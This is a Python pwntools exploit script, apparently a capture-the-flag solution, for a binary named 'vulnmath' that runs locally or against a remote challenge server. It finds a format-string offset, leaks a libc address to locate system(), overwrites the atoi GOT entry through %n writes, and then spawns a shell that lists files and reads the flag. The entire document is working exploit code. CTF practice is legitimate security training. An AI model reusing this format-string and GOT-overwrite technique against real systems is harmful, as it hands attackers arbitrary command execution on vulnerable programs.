from pwn import *
import sys

def offset_finder():
    for x in range (1, 100):
        p = process("./vulnmath")
        
        print "Offset number {}".format(x)

        payload = ""
        payload += "A" * 4
        payload += "%{}$p".format(x)

        p.sendline(payload)
        
        p.recvuntil("Incorrect!\n")
        # print p.recvline()[4:-1]
        stack_value = p.recvline()[4:-1]
        if stack_value.find("41414141") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
            
        p.close()

def exploit(p, libc_diff, libc):
    binary = ELF("vulnmath")
    payload = ''
    payload += '%23$p'

    p.sendline(payload)
    p.recvuntil("Incorrect!\n")

    libc_leak = int(p.recvline()[:-1], 16)
    log.info("Libc Diff : {}".format(hex(libc_diff)))
    log.info("__Libc_start_main: {}".format(hex(libc_leak)))
    libc.address = libc_leak - libc_diff
    log.info("Libc base : {}".format(hex(libc.address)))
    libc_system = libc.symbols['system']
    log.info("Libc system : 0x{0:x}".format(libc_system))

    atoi_got = binary.symbols["got.atoi"]
    log.info("atoi@got: {}".format(hex(atoi_got)))
    overwrite = str(hex(libc_system))[2:]
    first_overwrite = int(overwrite[4:], 16)
    log.info("First overwrite: {} or in hex {}".format(first_overwrite, hex(first_overwrite)))
    second_overwrite = int(overwrite[:4], 16)
    log.info("Second overwrite: {} or in hex {}".format(second_overwrite, hex(second_overwrite)))

    payload = ""
    payload += p32(atoi_got)
    payload += p32(atoi_got + 2)
    payload += "%6${}p".format(first_overwrite - len(payload))
    payload += "%6$n"
    payload += "%{}p".format(second_overwrite - first_overwrite)
    payload += "%7$n"

    # gdb.attach(p, """
    #             brva *0x08049446
    #             brva *0x0804944c
    #             c
    #             """)

    p.sendline(payload)
    sleep(1)
    p.sendline("/bin/sh\x00")
    p.sendline("ls -la && cat f*")
    p.interactive()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        log.info("Argument needed!")
        log.info("Usage: python {} <local/remote>".format(sys.argv[0]))
        sys.exit(0)
    elif sys.argv[1] == "local":
        p = process("./vulnmath")
        libc = ELF("libc6_2.27-3ubuntu1_i386.so")
        exploit(p, libc.symbols["__libc_start_main"] + 241, libc)
    elif sys.argv[1] == "remote":
        p = remote("chal.tuctf.com", 30502)
        libc = ELF("libc.so.6")
        exploit(p, libc.symbols["__libc_start_main"] + 249, libc)
    else:
        sys.exit(0)